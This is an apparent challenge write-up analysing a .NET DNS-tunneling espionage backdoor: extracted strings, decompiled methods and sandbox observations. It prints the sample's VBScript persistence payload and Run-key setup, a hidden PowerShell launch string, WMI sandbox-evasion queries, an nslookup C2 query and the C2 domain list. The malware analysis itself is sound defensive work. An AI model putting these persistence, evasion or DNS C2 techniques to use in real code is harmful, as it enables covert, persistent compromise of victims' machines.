--- Main ---

The malware sample belongs to a technical challenge. Manual offline analysis performed, as per request. This does not represent a "product" or "blog post." Instead, I focused on demonstrating my RE approach.

Original file name and MD5: 946990718894D0746E10BD655FBCFA03
SHA1: C09753412FA62DC179B1143FBB293FB038415105
File size: 31 KB

Test machine: Windows 10 Pro 64-bit (10.0, Build 17134), 8192MB RAM, English
Virtualization: VMWare Workstation 15 Pro 15.1.0 build-13591040

Comments: In this assessment, this is the fourth (4) sample I worked with.


--- Static Analysis ---

The sample is a .NET Windows PE. The PE sections look fairly normal (not packed). A significant number of malware-related strings exist. 

Interesting strings:

	ASCII:

		0000440B  get_ASCII
		00004415  System.IO
		0000441F  DownloadData
		0000442C  UploadData
		00004437  data
		0000443C  mscorlib
		00004445  gettingJob
		00004450  magic
		00004456  System.Collections.Generic
		00004471  get_Id
		00004478  get_CurrentThread
		00004492  get_IsAttached
		000044A1  System.Collections.Specialized
		000044C0  file_id
		000044C8  update_f_id
		000044D4  process_id
		000044DF  client_id
		000044E9  ReadToEnd
		000044F3  command
		000044FB  number_to_word
		00004512  hibridMode
		0000451D  change_mode
		00004529  x_mode
		00004530  removeGarbage
		0000453E  hasGarbage
		00004549  insertGarbage
		00004557  get_Message
		00004563  GetEnvironmentVariable
		000045A5  import_module
		000045B3  test_module
		000047E5  set_UseShellExecute
		000047F9  ToByte
		00004800  hex_to_byte
		0000480C  gdue
		00004811  get_Value
		0000481B  SetValue
		00004824  Remove
		0000482B  DNSProject.exe
		0000483A  min_query_size
		00004849  max_query_size
		000048D8  hex_to_string
		000048E6  hex_string
		00004917  GetFolderPath
		00004949  powerShell
		00004A24  show_pdf_function
		00004B69  jitter
		00004C71  request_types
		00004C7F  ReadAllBytes
		00004C8C  WriteAllBytes
		00004C9A  GetBytes
		00004CA3  UploadValues
		00004D85  IPAddress
		00004E0E  WebClient
		00004E18  web_client
		00006E80  C:\Users\william\Documents\Visual Studio 2015\Projects\DNSProject\DNSProject\obj\Release\DNSProject.pdb
		00006FBA  _CorExeMain
		00006FC6  mscoree.dll

	Unicode:

		00005064  \doc.pdf
		0000507C  .txt
		00005086  -U.txt
		00005102  Address:\s+(([a-fA-F0-9]{0,4}:{1,2}){1,8})
		00005158  Address:\s+\d+.\d+.\d+.\d+
		0000518E  Address:\s+40.112.(\d+.\d+)
		0000521C  ^kill
		0000523A  Thread has been kiled.
		00005268  Can't find thread ID.
		00005294  ^\$fileDownload
		000052B8  ^\$importModule
		0000548E  ipconfig /flushdns
		000054B4  nslookup.exe -timeout={0} -q={1} {2}.{3} {4}
		0000550E  nslookup.exe -timeout={0} -q={1} {2}-{5}.{3} {4}
		00005570  gogle.co
		00005582  nslookup.exe -timeout={0} -q={1} {2}.ac.{3} {4}
		000055E2  676f6f646c75636b
		00005880  Address:\s+(\d+.\d+.\d+.\d+)
		000058C2  powershell.exe
		000058E0  -WindowStyle Hidden -exec bypass -command {0}
		000059D8  (wmic computersystem get domain)[2]
		00005ABE  client_id
		00005AD2  client_secret
		00005AEE  application/x-www-form-urlencoded
		00005B32  POST
		00005B3C  "access_token":(.*)
		00005B64  Authorization
		00005B80  Bearer 
		00005D96  gwmi -query "select * from win32_BIOS where SMBIOSBIOSVERSION LIKE '%VBOX%'"
		00005E31  gwmi -query "select * from win32_BIOS where SMBIOSBIOSVERSION LIKE '%bochs%'"
		00005ECE  gwmi -query "select * from win32_BIOS where SMBIOSBIOSVERSION LIKE '%qemu%'"
		00005F69  gwmi -query "select * from win32_BIOS where SMBIOSBIOSVERSION LIKE '%VirtualBox%'"
		00006010  gwmi -query "select * from win32_BIOS where SMBIOSBIOSVERSION LIKE '%VM%'"
		000060A7  gwmi -query "Select * from win32_BIOS where Manufacturer LIKE '%XEN%'"
		00006135  gwmi win32_computersystem
		00006169  VMware
		00006178  gwmi -query "Select TotalPhysicalMemory from Win32_ComputerSystem"
		000061FE  TotalPhysicalMemory : (\d+)
		00006236  gwmi -Class win32_Processor | select NumberOfCores
		0000629C  .*(\d+)
		000062AC  Get-Process | select Company
		000062E6  Wireshark
		000062FA  Sysinternals
		00006315  on error resume next
		00006341  Dim appdata_path, exe_path
		00006379  Set shell = CreateObject("WScript.Shell")
		000063CF  appdata_path = shell.ExpandEnvironmentStrings("%SYSTEMDRIVE%") & "\Users\Public\Documents"
		00006487  exe_path = appdata_path + "\OfficeUpdateService.exe st:off pd:off"
		0000650F  WScript.echo exe_path
		0000653D  set process = GetObject("winmgmts:Win32_Process")
		000065A3  result = process.Create(exe_path, null, null, processid)
		00006615  \OfficeUpdateService.vbs
		00006647  \OfficeUpdateService.exe
		00006679  SOFTWARE\Microsoft\Windows\CurrentVersion\Run
		000066D5  OfficeUpdateService
		000066FD  cscript.exe "


The strings indicate a versatile malware sample capable of many feats including the detection of an analysis environment, system and network profiling (mainly via WMI, Windows Management Instrumentation), file i/o and execution, data r/w, file upload/download/POST, VBScript execution, and possibly remote control. "William" or variations of the common name may be useful for identifying the author(s).

dnSpy was able to thoroughly decompile and represent the .NET code.

Evasion code is immediately obvious: sandBoxEvasion(). This function uses Get-WmiObject queries to detect multiple virtual machine analysis environments (e.g. processor cores <= 1) and detection of running analysis software processes such as Wireshark and Sysinternals apps. sandBoxEvasion() concludes with a debugger check. If the sample detects undesirable system settings, the sample exits via Environment.Exit(1). To bypass this evasion code, within DNSProject.Program.Main(), one can nullify (NOP) execution of Program.sandBoxEvasion(). 

At this point, it is worth looking at DNSProject.Program.Main() to understand the sequence of events and get a better sense of the malware's purpose and capabilities. DNSProject.Program.Main() checks for two arguments: "st:off" (startup) and "pd:off" (PDF). This indicates the expectation that the sample can launch with optional purposes. Next, startup() is called (documented above). sandBoxEvasion() protections are skipped due to the default false value of sandboxEvision_controler. A test C2 (command and control) query is performed via queryTypesTest(). The malware then waits for additional activity via handler().

A selection of interesting methods:

	gat(): submits a remote POST HTTP request.

	gdd(): downloads remote data from Google Drive.
	
	gdmd_t(): downloads remote data from Google Drive related to file modification time.
	
	gdr(): removes remote data from Google Drive.
	
	gd_u(): uploads local data (concated string) to Google Drive.
	
	gd_uU(): uploads local data (a file) to Google Drive.
	
	(Note: methods beginning with "gd" denote Google Drive use.)

	gettingJob(): receives and processes jobs from handler() for C2 purposes.

	myInfo(): profiles system network information and returns a unique system identifier separated by pipe characters ("I").

	show_pdf_function(): writes data to and executes a file named doc.pdf. However, show_pdf_function() is not called by default. Also, the pdf_content variable is an empty string. This should have been a Base64 payload, but it may have been removed from this sample.

	powershell(): runs various PowerShell queries. PowerShell is executed evasively with "-WindowStyle Hidden -exec bypass -command {0}".

	insertGarbage() simply runs the self-explanatory string_to_hex() method.

	word_to_number(): assigns US alphabetical letters h through q numbers 0 through 9, respectively. Potentially useful for decoding transmissions. number_to_word() does the inverse.

	query(): runs in a loop and performs DNS queries for C2 communication. Note: if Debugger.IsAttached() is true, a DNS query is performed containing the hex-encoded string "goodluck". Another debugger check exists in this method after called Program.setSleep().

	startup(): writes a malicious VBScript payload named OfficeUpdateService.vbs to C:\Users\Public\Documents, makes an identical copy of the malware executable as OfficeUpdateService.exe in C:\Users\Public\Documents, establishes persistence via a Windows registry key (HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run) that runs the Windows cscript.exe tool on OfficeUpdateService.vbs.

	splitting(): used for parsing commands. Contains anti-debug.

	queryTypesTest(): performs a test to see if "ALL" or specific query types 


VBScript payload executed by startup():

	on error resume next
	
	Dim appdata_path, exe_path
	
	rSet shell = CreateObject(\"WScript.Shell\")
	
	appdata_path = shell.ExpandEnvironmentStrings(\"%SYSTEMDRIVE%\") & \"\\Users\\Public\\Documents\"
	
	rexe_path = appdata_path + \"\\OfficeUpdateService.exe st:off pd:off\"
	
	WScript.echo exe_path
	
	set process = GetObject(\"winmgmts:Win32_Process\")
	
	result = process.Create(exe_path, null, null, processid)


Interesting properties:
	
	"2600:1417:3::5f64:aa31" = associated with AKAMAI CDN.
	"205.185.216.\\d+" = 205.185.216.* = associated with Highwinds Network Group, Inc. (StackPath) CDN.

	private static string[] queryTypes = new string[]
	{
		"TXT",
		"SOA",
		"MX",
		"CNAME",
		"SRV",
		"A",
		"AC",
		"AAAA"
	};

	private static string[] domainList = new string[]
	{
		"akdns.live",
		"akamaiedge.live",
		"edgekey.live",
		"akamaized.live"
	};
	
	private static string cancel_domains = "216.58.192.174|2a00:1450:4001:81a::200e|2200::|download.microsoft.com|ntservicepack.microsoft.com|windowsupdate.microsoft.com|update.microsoft.com";	
	
	(216.58.192.174 = Google)
	(2a00:1450:4001:81a::200e = fra16s14-in-x0e.1e100.net)
	(The purpose of the cancel domains is to return the string "cancel" if a DNS query response contains one of the cancel_domain strings.)
		
	
	(Note: fully operable C2 servers may have yielded more intel.)


--- Live Analysis ---

DNSProject.Main() is executed as observed in static analysis.

OfficeUpdateService.vbs and OfficeUpdateService.exe are written to C:\Users\Public\Documents:

	OfficeUpdateService.vbs MD5: 82819770E715EBB9F3AE110E9883399A
	OfficeUpdateService.vbs SHA1: 25E452FD2E07C5964A0D6C478D40E22F9CC52BC5
	OfficeUpdateService.exe MD5: 946990718894D0746E10BD655FBCFA03	
	OfficeUpdateService.exe SHA1: C09753412FA62DC179B1143FBB293FB038415105
	
	(Note that OfficeUpdateService.exe is identical to the malware sample; it is a copy.)
	

Soon after starting, the malware fails in queryTypesTest() here:

	text3 = Program.query(Program.request_types[0] + Program.number_to_word(id.ToString()) + Program.comm_model, text2, true, false);
	

The previous code calls Program.query() like so:

	Program.query("ajqojc", "TXT", true, false);


Program.query() then attempts to use nslookup.exe to get the TXT record for akamaiedge.live:

	nslookup.exe -timeout=10 -q=TXT ajqojc.akamaiedge.live


This request fails within my non-Internet VM like so:	

	"Server:  UnKnown\r\nAddress:  127.0.0.1\r\n\r\n"


By the way, a WHOIS on akamaiedge.live shows the organization as "forog4trasen".
	
Pinging ajqojc.akamaiedge.live and akamaiedge.live fail on my Internet-connected VM. The ISP likely took action. As a result, the sample runs in a loop trying to establish a connection with the C2 server. Pings to these C2 hosts also fail:

		akdns.live
		akamaiedge.live
		edgekey.live
		akamaized.live

		
For continued analysis, we could patch the .NET binary, emulate a host, etc. However, the readable .NET code tells us quite a bit already. Also, testing indicates the C2 servers have been taken down, which likely extends to related Google services.


--- Conclusion ---

This is a C2 (command and control or C&C) malware that may be commercial and/or custom-built for specific targets. The author may be an individual or group, though the lack of protection and spelling mistakes may indicate non-U.S. development with limited resources. Successful remote file downloading and execution would have allowed for other malware to run rampant on affected systems. Overall, this is a versatile, C2 espionage malware capable of system persistence, profiling, file uploading, downloading, and execution. C2 is handled via various DNS query types with support for Google Drive as a file server and/or a backup means of C2 control.
